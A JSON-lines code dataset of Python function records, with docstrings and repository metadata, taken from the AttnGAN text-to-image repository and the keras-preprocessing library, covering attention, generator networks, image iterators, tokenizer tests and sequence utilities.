{"docstring": "\"\"\"\nquery: batch x ndf x queryL\ncontext: batch x ndf x ih x iw (sourceL=ihxiw)\nmask: batch_size x sourceL\n\"\"\"\n", "func_signal": "def func_attention(query, context, gamma1):\n", "code": "batch_size, queryL = query.size(0), query.size(2)\nih, iw = context.size(2), context.size(3)\nsourceL = ih * iw\n\n# --> batch x sourceL x ndf\ncontext = context.view(batch_size, -1, sourceL)\ncontextT = torch.transpose(context, 1, 2).contiguous()\n\n# Get attention\n# (batch x sourceL x ndf)(batch x ndf x queryL)\n# -->batch x sourceL x queryL\nattn = torch.bmm(contextT, query) # Eq. (7) in AttnGAN paper\n# --> batch*sourceL x queryL\nattn = attn.view(batch_size*sourceL, queryL)\nattn = nn.Softmax()(attn)  # Eq. (8)\n\n# --> batch x sourceL x queryL\nattn = attn.view(batch_size, sourceL, queryL)\n# --> batch*queryL x sourceL\nattn = torch.transpose(attn, 1, 2).contiguous()\nattn = attn.view(batch_size*queryL, sourceL)\n#  Eq. (9)\nattn = attn * gamma1\nattn = nn.Softmax()(attn)\nattn = attn.view(batch_size, queryL, sourceL)\n# --> batch x sourceL x queryL\nattnT = torch.transpose(attn, 1, 2).contiguous()\n\n# (batch x ndf x sourceL)(batch x sourceL x queryL)\n# --> batch x ndf x queryL\nweightedContext = torch.bmm(context, attnT)\n\nreturn weightedContext, attn.view(batch_size, -1, ih, iw)", "path": "AttnGAN/code/GlobalAttention.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\n    :param z_code: batch x cfg.GAN.Z_DIM\n    :param sent_emb: batch x cfg.TEXT.EMBEDDING_DIM\n    :param word_embs: batch x cdf x seq_len\n    :param mask: batch x seq_len\n    :return:\n\"\"\"\n", "func_signal": "def forward(self, z_code, sent_emb, word_embs, mask):\n", "code": "fake_imgs = []\natt_maps = []\nc_code, mu, logvar = self.ca_net(sent_emb)\n\nif cfg.TREE.BRANCH_NUM > 0:\n    h_code1 = self.h_net1(z_code, c_code)\n    fake_img1 = self.img_net1(h_code1)\n    fake_imgs.append(fake_img1)\nif cfg.TREE.BRANCH_NUM > 1:\n    h_code2, att1 = \\\n        self.h_net2(h_code1, c_code, word_embs, mask)\n    fake_img2 = self.img_net2(h_code2)\n    fake_imgs.append(fake_img2)\n    if att1 is not None:\n        att_maps.append(att1)\nif cfg.TREE.BRANCH_NUM > 2:\n    h_code3, att2 = \\\n        self.h_net3(h_code2, c_code, word_embs, mask)\n    fake_img3 = self.img_net3(h_code3)\n    fake_imgs.append(fake_img3)\n    if att2 is not None:\n        att_maps.append(att2)\n\nreturn fake_imgs, att_maps, mu, logvar", "path": "AttnGAN/eval/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "# input: torch.LongTensor of size batch x n_steps\n# --> emb: batch x n_steps x ninput\n", "func_signal": "def forward(self, captions, cap_lens, hidden, mask=None):\n", "code": "emb = self.drop(self.encoder(captions))\n#\n# Returns: a PackedSequence object\ncap_lens = cap_lens.data.tolist()\nemb = pack_padded_sequence(emb, cap_lens, batch_first=True)\n# #hidden and memory (num_layers * num_directions, batch, hidden_size):\n# tensor containing the initial hidden state for each element in batch.\n# #output (batch, seq_len, hidden_size * num_directions)\n# #or a PackedSequence object:\n# tensor containing output features (h_t) from the last layer of RNN\noutput, hidden = self.rnn(emb, hidden)\n# PackedSequence object\n# --> (batch, seq_len, hidden_size * num_directions)\noutput = pad_packed_sequence(output, batch_first=True)[0]\n# output = self.drop(output)\n# --> batch x hidden_size*num_directions x seq_len\nwords_emb = output.transpose(1, 2)\n# --> batch x num_directions*hidden_size\nif self.rnn_type == 'LSTM':\n    sent_emb = hidden[0].transpose(0, 1).contiguous()\nelse:\n    sent_emb = hidden.transpose(0, 1).contiguous()\nsent_emb = sent_emb.view(-1, self.nhidden * self.num_directions)\nreturn words_emb, sent_emb", "path": "AttnGAN/eval/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "# build model ############################################################\n", "func_signal": "def build_models():\n", "code": "text_encoder = RNN_ENCODER(dataset.n_words, nhidden=cfg.TEXT.EMBEDDING_DIM)\nimage_encoder = CNN_ENCODER(cfg.TEXT.EMBEDDING_DIM)\nlabels = Variable(torch.LongTensor(range(batch_size)))\nstart_epoch = 0\nif cfg.TRAIN.NET_E != '':\n    state_dict = torch.load(cfg.TRAIN.NET_E)\n    text_encoder.load_state_dict(state_dict)\n    print('Load ', cfg.TRAIN.NET_E)\n    #\n    name = cfg.TRAIN.NET_E.replace('text_encoder', 'image_encoder')\n    state_dict = torch.load(name)\n    image_encoder.load_state_dict(state_dict)\n    print('Load ', name)\n\n    istart = cfg.TRAIN.NET_E.rfind('_') + 8\n    iend = cfg.TRAIN.NET_E.rfind('.')\n    start_epoch = cfg.TRAIN.NET_E[istart:iend]\n    start_epoch = int(start_epoch) + 1\n    print('start_epoch', start_epoch)\nif cfg.CUDA:\n    text_encoder = text_encoder.cuda()\n    image_encoder = image_encoder.cuda()\n    labels = labels.cuda()\n\nreturn text_encoder, image_encoder, labels, start_epoch", "path": "AttnGAN/code/pretrain_DAMSM.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\n    :param z_code: batch x cfg.GAN.Z_DIM\n    :param sent_emb: batch x cfg.TEXT.EMBEDDING_DIM\n    :param word_embs: batch x cdf x seq_len\n    :param mask: batch x seq_len\n    :return:\n\"\"\"\n", "func_signal": "def forward(self, z_code, sent_emb, word_embs, mask):\n", "code": "att_maps = []\nc_code, mu, logvar = self.ca_net(sent_emb)\nif cfg.TREE.BRANCH_NUM > 0:\n    h_code = self.h_net1(z_code, c_code)\nif cfg.TREE.BRANCH_NUM > 1:\n    h_code, att1 = self.h_net2(h_code, c_code, word_embs, mask)\n    if att1 is not None:\n        att_maps.append(att1)\nif cfg.TREE.BRANCH_NUM > 2:\n    h_code, att2 = self.h_net3(h_code, c_code, word_embs, mask)\n    if att2 is not None:\n        att_maps.append(att2)\n\nfake_imgs = self.img_net(h_code)\nreturn [fake_imgs], att_maps, mu, logvar", "path": "AttnGAN/code/model.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "# create caption vector\n", "func_signal": "def vectorize_caption(wordtoix, caption, copies=2):\n", "code": "tokens = caption.split(' ')\ncap_v = []\nfor t in tokens:\n    t = t.strip().encode('ascii', 'ignore').decode('ascii')\n    if len(t) > 0 and t in wordtoix:\n        cap_v.append(wordtoix[t])\n\n# expected state for single generation\ncaptions = np.zeros((copies, len(cap_v)))\nfor i in range(copies):\n    captions[i,:] = np.array(cap_v)\ncap_lens = np.zeros(copies) + len(cap_v)\n\n#print(captions.astype(int), cap_lens.astype(int))\n#captions, cap_lens = np.array([cap_v, cap_v]), np.array([len(cap_v), len(cap_v)])\n#print(captions, cap_lens)\n#return captions, cap_lens\n\nreturn captions.astype(int), cap_lens.astype(int)", "path": "AttnGAN/eval/eval.py", "commit_date": "2018-04-27 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\nquery: batch x ndf x queryL\ncontext: batch x ndf x ih x iw (sourceL=ihxiw)\nmask: batch_size x sourceL\n\"\"\"\n", "func_signal": "def func_attention(query, context, gamma1):\n", "code": "batch_size, queryL = query.size(0), query.size(2)\nih, iw = context.size(2), context.size(3)\nsourceL = ih * iw\n\n# --> batch x sourceL x ndf\ncontext = context.view(batch_size, -1, sourceL)\ncontextT = torch.transpose(context, 1, 2).contiguous()\n\n# Get attention\n# (batch x sourceL x ndf)(batch x ndf x queryL)\n# -->batch x sourceL x queryL\nattn = torch.bmm(contextT, query) # Eq. (7) in AttnGAN paper\n# --> batch*sourceL x queryL\nattn = attn.view(batch_size*sourceL, queryL)\nattn = nn.Softmax()(attn)  # Eq. (8)\n\n# --> batch x sourceL x queryL\nattn = attn.view(batch_size, sourceL, queryL)\n# --> batch*queryL x sourceL\nattn = torch.transpose(attn, 1, 2).contiguous()\nattn = attn.view(batch_size*queryL, sourceL)\n#  Eq. (9)\nattn = attn * gamma1\nattn = nn.Softmax()(attn)\nattn = attn.view(batch_size, queryL, sourceL)\n# --> batch x sourceL x queryL\nattnT = torch.transpose(attn, 1, 2).contiguous()\n\n# (batch x ndf x sourceL)(batch x sourceL x queryL)\n# --> batch x ndf x queryL\nweightedContext = torch.bmm(context, attnT)\n\nreturn weightedContext, attn.view(batch_size, -1, ih, iw)", "path": "AttnGAN/eval/GlobalAttention.py", "commit_date": "2018-03-07 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"Merge config dictionary a into config dictionary b, clobbering the\noptions in b whenever they are also specified in a.\n\"\"\"\n", "func_signal": "def _merge_a_into_b(a, b):\n", "code": "if type(a) is not edict:\n    return\n\nfor k, v in a.iteritems():\n    # a must specify keys that are in b\n    if not b.has_key(k):\n        raise KeyError('{} is not a valid config key'.format(k))\n\n    # the types must match, too\n    old_type = type(b[k])\n    if old_type is not type(v):\n        if isinstance(b[k], np.ndarray):\n            v = np.array(v, dtype=b[k].dtype)\n        else:\n            raise ValueError(('Type mismatch ({} vs. {}) '\n                              'for config key: {}').format(type(b[k]),\n                                                           type(v), k))\n\n    # recursively merge dicts\n    if type(v) is edict:\n        try:\n            _merge_a_into_b(a[k], b[k])\n        except:\n            print('Error under config key: {}'.format(k))\n            raise\n    else:\n        b[k] = v", "path": "AttnGAN/code/miscc/config.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "# load word vector\n", "func_signal": "def generate(caption, wordtoix, ixtoword, text_encoder, netG, blob_service, copies=2):\n", "code": "captions, cap_lens  = vectorize_caption(wordtoix, caption, copies)\nn_words = len(wordtoix)\n\n# only one to generate\nbatch_size = captions.shape[0]\n\nnz = cfg.GAN.Z_DIM\ncaptions = Variable(torch.from_numpy(captions), volatile=True)\ncap_lens = Variable(torch.from_numpy(cap_lens), volatile=True)\nnoise = Variable(torch.FloatTensor(batch_size, nz), volatile=True)\n\nif cfg.CUDA:\n    captions = captions.cuda()\n    cap_lens = cap_lens.cuda()\n    noise = noise.cuda()\n\n\n\n#######################################################\n# (1) Extract text embeddings\n#######################################################\nhidden = text_encoder.init_hidden(batch_size)\nwords_embs, sent_emb = text_encoder(captions, cap_lens, hidden)\nmask = (captions == 0)\n    \n\n#######################################################\n# (2) Generate fake images\n#######################################################\nnoise.data.normal_(0, 1)\nfake_imgs, attention_maps, _, _ = netG(noise, sent_emb, words_embs, mask)\n\n# ONNX EXPORT\n#export = os.environ[\"EXPORT_MODEL\"].lower() == 'true'\nif False:\n    print(\"saving text_encoder.onnx\")\n    text_encoder_out = torch.onnx._export(text_encoder, (captions, cap_lens, hidden), \"text_encoder.onnx\", export_params=True)\n    print(\"uploading text_encoder.onnx\")\n    blob_service.create_blob_from_path('models', \"text_encoder.onnx\", os.path.abspath(\"text_encoder.onnx\"))\n    print(\"done\")\n\n    print(\"saving netg.onnx\")\n    netg_out = torch.onnx._export(netG, (noise, sent_emb, words_embs, mask), \"netg.onnx\", export_params=True)\n    print(\"uploading netg.onnx\")\n    blob_service.create_blob_from_path('models', \"netg.onnx\", os.path.abspath(\"netg.onnx\"))\n    print(\"done\")\n    return\n\n# G attention\ncap_lens_np = cap_lens.cpu().data.numpy()\n\n# storing to blob storage\ncontainer_name = \"images\"\nfull_path = \"https://attgan.blob.core.windows.net/images/%s\"\nprefix = datetime.now().strftime('%Y/%B/%d/%H_%M_%S_%f')\nurls = []\n# only look at first one\n#j = 0\nfor j in range(batch_size):\n    for k in range(len(fake_imgs)):\n        im = fake_imgs[k][j].data.cpu().numpy()\n        im = (im + 1.0) * 127.5\n        im = im.astype(np.uint8)\n        im = np.transpose(im, (1, 2, 0))\n        im = Image.fromarray(im)\n\n        # save image to stream\n        stream = io.BytesIO()\n        im.save(stream, format=\"png\")\n        stream.seek(0)\n        if copies > 2:\n            blob_name = '%s/%d/%s_g%d.png' % (prefix, j, \"bird\", k)\n        else:\n            blob_name = '%s/%s_g%d.png' % (prefix, \"bird\", k)\n        blob_service.create_blob_from_stream(container_name, blob_name, stream)\n        urls.append(full_path % blob_name)\n\n        if copies == 2:\n            for k in range(len(attention_maps)):\n            #if False:\n                if len(fake_imgs) > 1:\n                    im = fake_imgs[k + 1].detach().cpu()\n                else:\n                    im = fake_imgs[0].detach().cpu()\n                        \n                attn_maps = attention_maps[k]\n                att_sze = attn_maps.size(2)\n\n                img_set, sentences = \\\n                    build_super_images2(im[j].unsqueeze(0),\n                                        captions[j].unsqueeze(0),\n                                        [cap_lens_np[j]], ixtoword,\n                                        [attn_maps[j]], att_sze)\n\n                if img_set is not None:\n                    im = Image.fromarray(img_set)\n                    stream = io.BytesIO()\n                    im.save(stream, format=\"png\")\n                    stream.seek(0)\n\n                    blob_name = '%s/%s_a%d.png' % (prefix, \"attmaps\", k)\n                    blob_service.create_blob_from_stream(container_name, blob_name, stream)\n                    urls.append(full_path % blob_name)\n    if copies == 2:\n        break\n\n#print(len(urls), urls)\nreturn urls", "path": "AttnGAN/eval/eval.py", "commit_date": "2018-04-27 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "\"\"\"\n:param z_code: batch x cfg.GAN.Z_DIM\n:param c_code: batch x cfg.TEXT.EMBEDDING_DIM\n:return: batch x ngf/16 x 64 x 64\n\"\"\"\n", "func_signal": "def forward(self, z_code, c_code):\n", "code": "c_z_code = torch.cat((c_code, z_code), 1)\n# state size ngf x 4 x 4\nout_code = self.fc(c_z_code)\nout_code = out_code.view(-1, self.gf_dim, 4, 4)\n# state size ngf/3 x 8 x 8\nout_code = self.upsample1(out_code)\n# state size ngf/4 x 16 x 16\nout_code = self.upsample2(out_code)\n# state size ngf/8 x 32 x 32\nout_code32 = self.upsample3(out_code)\n# state size ngf/16 x 64 x 64\nout_code64 = self.upsample4(out_code32)\n\nreturn out_code64", "path": "AttnGAN/code/model.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "taoxugit/AttnGAN", "stars": 1312, "license": "mit", "language": "python", "size": 37645}
{"docstring": "'''Returns the TimeseriesGenerator configuration as Python dictionary.\n\n# Returns\n    A Python dictionary with the TimeseriesGenerator configuration.\n'''\n", "func_signal": "def get_config(self):\n", "code": "data = self.data\nif type(self.data).__module__ == np.__name__:\n    data = self.data.tolist()\ntry:\n    json_data = json.dumps(data)\nexcept TypeError:\n    raise TypeError('Data not JSON Serializable:', data)\n\ntargets = self.targets\nif type(self.targets).__module__ == np.__name__:\n    targets = self.targets.tolist()\ntry:\n    json_targets = json.dumps(targets)\nexcept TypeError:\n    raise TypeError('Targets not JSON Serializable:', targets)\n\nreturn {\n    'data': json_data,\n    'targets': json_targets,\n    'length': self.length,\n    'sampling_rate': self.sampling_rate,\n    'stride': self.stride,\n    'start_index': self.start_index,\n    'end_index': self.end_index,\n    'shuffle': self.shuffle,\n    'reverse': self.reverse,\n    'batch_size': self.batch_size\n}", "path": "keras-preprocessing/keras_preprocessing/sequence.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Gets a batch of transformed samples.\n\n# Arguments\n    index_array: Array of sample indices to include in batch.\n\n# Returns\n    A batch of transformed samples.\n\"\"\"\n", "func_signal": "def _get_batches_of_transformed_samples(self, index_array):\n", "code": "batch_x = np.zeros((len(index_array),) + self.image_shape, dtype=self.dtype)\n# build batch of image data\n# self.filepaths is dynamic, is better to call it once outside the loop\nfilepaths = self.filepaths\nfor i, j in enumerate(index_array):\n    img = load_img(filepaths[j],\n                   color_mode=self.color_mode,\n                   target_size=self.target_size,\n                   interpolation=self.interpolation)\n    x = img_to_array(img, data_format=self.data_format)\n    # Pillow images should be closed after `load_img`,\n    # but not PIL images.\n    if hasattr(img, 'close'):\n        img.close()\n    if self.image_data_generator:\n        params = self.image_data_generator.get_random_transform(x.shape)\n        x = self.image_data_generator.apply_transform(x, params)\n        x = self.image_data_generator.standardize(x)\n    batch_x[i] = x\n# optionally save augmented images to disk for debugging purposes\nif self.save_to_dir:\n    for i, j in enumerate(index_array):\n        img = array_to_img(batch_x[i], self.data_format, scale=True)\n        fname = '{prefix}_{index}_{hash}.{format}'.format(\n            prefix=self.save_prefix,\n            index=j,\n            hash=np.random.randint(1e7),\n            format=self.save_format)\n        img.save(os.path.join(self.save_to_dir, fname))\n# build batch of labels\nif self.class_mode == 'input':\n    batch_y = batch_x.copy()\nelif self.class_mode in {'binary', 'sparse'}:\n    batch_y = np.empty(len(batch_x), dtype=self.dtype)\n    for i, n_observation in enumerate(index_array):\n        batch_y[i] = self.classes[n_observation]\nelif self.class_mode == 'categorical':\n    batch_y = np.zeros((len(batch_x), len(self.class_indices)),\n                       dtype=self.dtype)\n    for i, n_observation in enumerate(index_array):\n        batch_y[i, self.classes[n_observation]] = 1.\nelif self.class_mode == 'multi_output':\n    batch_y = [output[index_array] for output in self.labels]\nelif self.class_mode == 'raw':\n    batch_y = self.labels[index_array]\nelse:\n    return batch_x\nif self.sample_weight is None:\n    return batch_x, batch_y\nelse:\n    return batch_x, batch_y, self.sample_weight[index_array]", "path": "keras-preprocessing/keras_preprocessing/image/iterator.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Generates a word rank-based probabilistic sampling table.\n\nUsed for generating the `sampling_table` argument for `skipgrams`.\n`sampling_table[i]` is the probability of sampling\nthe word i-th most common word in a dataset\n(more common words should be sampled less frequently, for balance).\n\nThe sampling probabilities are generated according\nto the sampling distribution used in word2vec:\n\n```\np(word) = (min(1, sqrt(word_frequency / sampling_factor) /\n    (word_frequency / sampling_factor)))\n```\n\nWe assume that the word frequencies follow Zipf's law (s=1) to derive\na numerical approximation of frequency(rank):\n\n`frequency(rank) ~ 1/(rank * (log(rank) + gamma) + 1/2 - 1/(12*rank))`\nwhere `gamma` is the Euler-Mascheroni constant.\n\n# Arguments\n    size: Int, number of possible words to sample.\n    sampling_factor: The sampling factor in the word2vec formula.\n\n# Returns\n    A 1D Numpy array of length `size` where the ith entry\n    is the probability that a word of rank i should be sampled.\n\"\"\"\n", "func_signal": "def make_sampling_table(size, sampling_factor=1e-5):\n", "code": "gamma = 0.577\nrank = np.arange(size)\nrank[0] = 1\ninv_fq = rank * (np.log(rank) + gamma) + 0.5 - 1. / (12. * rank)\nf = sampling_factor * inv_fq\n\nreturn np.minimum(1., f / np.sqrt(f))", "path": "keras-preprocessing/keras_preprocessing/sequence.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Removes sequences that exceed the maximum length.\n\n# Arguments\n    maxlen: Int, maximum length of the output sequences.\n    seq: List of lists, where each sublist is a sequence.\n    label: List where each element is an integer.\n\n# Returns\n    new_seq, new_label: shortened lists for `seq` and `label`.\n\"\"\"\n", "func_signal": "def _remove_long_seq(maxlen, seq, label):\n", "code": "new_seq, new_label = [], []\nfor x, y in zip(seq, label):\n    if len(x) < maxlen:\n        new_seq.append(x)\n        new_label.append(y)\nreturn new_seq, new_label", "path": "keras-preprocessing/keras_preprocessing/sequence.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Tests for `lower` flag in text.Tokenizer\n\"\"\"\n# word level tokenizer with sentences as texts\n", "func_signal": "def test_tokenizer_lower_flag():\n", "code": "word_tokenizer = text.Tokenizer(lower=True)\ntexts = ['The cat sat on the mat.',\n         'The dog sat on the log.',\n         'Dog and Cat living Together.']\nword_tokenizer.fit_on_texts(texts)\nexpected_word_counts = OrderedDict([('the', 4), ('cat', 2), ('sat', 2),\n                                    ('on', 2), ('mat', 1), ('dog', 2),\n                                    ('log', 1), ('and', 1), ('living', 1),\n                                    ('together', 1)])\nassert word_tokenizer.word_counts == expected_word_counts\n\n# word level tokenizer with word_sequences as texts\nword_tokenizer = text.Tokenizer(lower=True)\nword_sequences = [\n    ['The', 'cat', 'is', 'sitting'],\n    ['The', 'dog', 'is', 'standing']\n]\nword_tokenizer.fit_on_texts(word_sequences)\nexpected_word_counts = OrderedDict([('the', 2), ('cat', 1), ('is', 2),\n                                    ('sitting', 1), ('dog', 1),\n                                    ('standing', 1)])\nassert word_tokenizer.word_counts == expected_word_counts\n\n# char level tokenizer with sentences as texts\nchar_tokenizer = text.Tokenizer(lower=True, char_level=True)\ntexts = ['The cat sat on the mat.',\n         'The dog sat on the log.',\n         'Dog and Cat living Together.']\nchar_tokenizer.fit_on_texts(texts)\nexpected_word_counts = OrderedDict([('t', 11), ('h', 5), ('e', 6), (' ', 14),\n                                    ('c', 2), ('a', 6), ('s', 2), ('o', 6),\n                                    ('n', 4), ('m', 1), ('.', 3), ('d', 3),\n                                    ('g', 5), ('l', 2), ('i', 2), ('v', 1),\n                                    ('r', 1)])\nassert char_tokenizer.word_counts == expected_word_counts", "path": "keras-preprocessing/tests/text_test.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Applies a random transformation to an image.\n\n# Arguments\n    x: 3D tensor, single image.\n    seed: Random seed.\n\n# Returns\n    A randomly transformed version of the input (same shape).\n\"\"\"\n", "func_signal": "def random_transform(self, x, seed=None):\n", "code": "params = self.get_random_transform(x.shape, seed)\nreturn self.apply_transform(x, params)", "path": "keras-preprocessing/keras_preprocessing/image/image_data_generator.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "# check class mode is one of the currently supported\n", "func_signal": "def _check_params(self, df, x_col, y_col, weight_col, classes):\n", "code": "if self.class_mode not in self.allowed_class_modes:\n    raise ValueError('Invalid class_mode: {}; expected one of: {}'\n                     .format(self.class_mode, self.allowed_class_modes))\n# check that y_col has several column names if class_mode is multi_output\nif (self.class_mode == 'multi_output') and not isinstance(y_col, list):\n    raise TypeError(\n        'If class_mode=\"{}\", y_col must be a list. Received {}.'\n        .format(self.class_mode, type(y_col).__name__)\n    )\n# check that filenames/filepaths column values are all strings\nif not all(df[x_col].apply(lambda x: isinstance(x, str))):\n    raise TypeError('All values in column x_col={} must be strings.'\n                    .format(x_col))\n# check labels are string if class_mode is binary or sparse\nif self.class_mode in {'binary', 'sparse'}:\n    if not all(df[y_col].apply(lambda x: isinstance(x, str))):\n        raise TypeError('If class_mode=\"{}\", y_col=\"{}\" column '\n                        'values must be strings.'\n                        .format(self.class_mode, y_col))\n# check that if binary there are only 2 different classes\nif self.class_mode == 'binary':\n    if classes:\n        classes = set(classes)\n        if len(classes) != 2:\n            raise ValueError('If class_mode=\"binary\" there must be 2 '\n                             'classes. {} class/es were given.'\n                             .format(len(classes)))\n    elif df[y_col].nunique() != 2:\n        raise ValueError('If class_mode=\"binary\" there must be 2 classes. '\n                         'Found {} classes.'.format(df[y_col].nunique()))\n# check values are string, list or tuple if class_mode is categorical\nif self.class_mode == 'categorical':\n    types = (str, list, tuple)\n    if not all(df[y_col].apply(lambda x: isinstance(x, types))):\n        raise TypeError('If class_mode=\"{}\", y_col=\"{}\" column '\n                        'values must be type string, list or tuple.'\n                        .format(self.class_mode, y_col))\n# raise warning if classes are given but will be unused\nif classes and self.class_mode in {\"input\", \"multi_output\", \"raw\", None}:\n    warnings.warn('`classes` will be ignored given the class_mode=\"{}\"'\n                  .format(self.class_mode))\n# check that if weight column that the values are numerical\nif weight_col and not issubclass(df[weight_col].dtype.type, np.number):\n    raise TypeError('Column weight_col={} must be numeric.'\n                    .format(weight_col))", "path": "keras-preprocessing/keras_preprocessing/image/dataframe_iterator.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Applies a transformation to an image according to given parameters.\n\n# Arguments\n    x: 3D tensor, single image.\n    transform_parameters: Dictionary with string - parameter pairs\n        describing the transformation.\n        Currently, the following parameters\n        from the dictionary are used:\n        - `'theta'`: Float. Rotation angle in degrees.\n        - `'tx'`: Float. Shift in the x direction.\n        - `'ty'`: Float. Shift in the y direction.\n        - `'shear'`: Float. Shear angle in degrees.\n        - `'zx'`: Float. Zoom in the x direction.\n        - `'zy'`: Float. Zoom in the y direction.\n        - `'flip_horizontal'`: Boolean. Horizontal flip.\n        - `'flip_vertical'`: Boolean. Vertical flip.\n        - `'channel_shift_intensity'`: Float. Channel shift intensity.\n        - `'brightness'`: Float. Brightness shift intensity.\n\n# Returns\n    A transformed version of the input (same shape).\n\"\"\"\n# x is a single image, so it doesn't have image number at index 0\n", "func_signal": "def apply_transform(self, x, transform_parameters):\n", "code": "img_row_axis = self.row_axis - 1\nimg_col_axis = self.col_axis - 1\nimg_channel_axis = self.channel_axis - 1\n\nx = apply_affine_transform(x, transform_parameters.get('theta', 0),\n                           transform_parameters.get('tx', 0),\n                           transform_parameters.get('ty', 0),\n                           transform_parameters.get('shear', 0),\n                           transform_parameters.get('zx', 1),\n                           transform_parameters.get('zy', 1),\n                           row_axis=img_row_axis,\n                           col_axis=img_col_axis,\n                           channel_axis=img_channel_axis,\n                           fill_mode=self.fill_mode,\n                           cval=self.cval,\n                           order=self.interpolation_order)\n\nif transform_parameters.get('channel_shift_intensity') is not None:\n    x = apply_channel_shift(x,\n                            transform_parameters['channel_shift_intensity'],\n                            img_channel_axis)\n\nif transform_parameters.get('flip_horizontal', False):\n    x = flip_axis(x, img_col_axis)\n\nif transform_parameters.get('flip_vertical', False):\n    x = flip_axis(x, img_row_axis)\n\nif transform_parameters.get('brightness') is not None:\n    x = apply_brightness_shift(x, transform_parameters['brightness'], False)\n\nreturn x", "path": "keras-preprocessing/keras_preprocessing/image/image_data_generator.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Applies the normalization configuration in-place to a batch of inputs.\n\n`x` is changed in-place since the function is mainly used internally\nto standardize images and feed them to your network. If a copy of `x`\nwould be created instead it would have a significant performance cost.\nIf you want to apply this method without changing the input in-place\nyou can call the method creating a copy before:\n\nstandardize(np.copy(x))\n\n# Arguments\n    x: Batch of inputs to be normalized.\n\n# Returns\n    The inputs, normalized.\n\"\"\"\n", "func_signal": "def standardize(self, x):\n", "code": "if self.preprocessing_function:\n    x = self.preprocessing_function(x)\nif self.rescale:\n    x *= self.rescale\nif self.samplewise_center:\n    x -= np.mean(x, keepdims=True)\nif self.samplewise_std_normalization:\n    x /= (np.std(x, keepdims=True) + 1e-6)\n\nif self.featurewise_center:\n    if self.mean is not None:\n        x -= self.mean\n    else:\n        warnings.warn('This ImageDataGenerator specifies '\n                      '`featurewise_center`, but it hasn\\'t '\n                      'been fit on any training data. Fit it '\n                      'first by calling `.fit(numpy_data)`.')\nif self.featurewise_std_normalization:\n    if self.std is not None:\n        x /= (self.std + 1e-6)\n    else:\n        warnings.warn('This ImageDataGenerator specifies '\n                      '`featurewise_std_normalization`, '\n                      'but it hasn\\'t '\n                      'been fit on any training data. Fit it '\n                      'first by calling `.fit(numpy_data)`.')\nif self.zca_whitening:\n    if self.principal_components is not None:\n        flatx = np.reshape(x, (-1, np.prod(x.shape[-3:])))\n        whitex = np.dot(flatx, self.principal_components)\n        x = np.reshape(whitex, x.shape)\n    else:\n        warnings.warn('This ImageDataGenerator specifies '\n                      '`zca_whitening`, but it hasn\\'t '\n                      'been fit on any training data. Fit it '\n                      'first by calling `.fit(numpy_data)`.')\nreturn x", "path": "keras-preprocessing/keras_preprocessing/image/image_data_generator.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
{"docstring": "\"\"\"Returns a JSON string containing the timeseries generator\nconfiguration. To load a generator from a JSON string, use\n`keras.preprocessing.sequence.timeseries_generator_from_json(json_string)`.\n\n# Arguments\n    **kwargs: Additional keyword arguments\n        to be passed to `json.dumps()`.\n\n# Returns\n    A JSON string containing the tokenizer configuration.\n\"\"\"\n", "func_signal": "def to_json(self, **kwargs):\n", "code": "config = self.get_config()\ntimeseries_generator_config = {\n    'class_name': self.__class__.__name__,\n    'config': config\n}\nreturn json.dumps(timeseries_generator_config, **kwargs)", "path": "keras-preprocessing/keras_preprocessing/sequence.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "keras-team/keras-preprocessing", "stars": 1024, "license": "other", "language": "python", "size": 470}
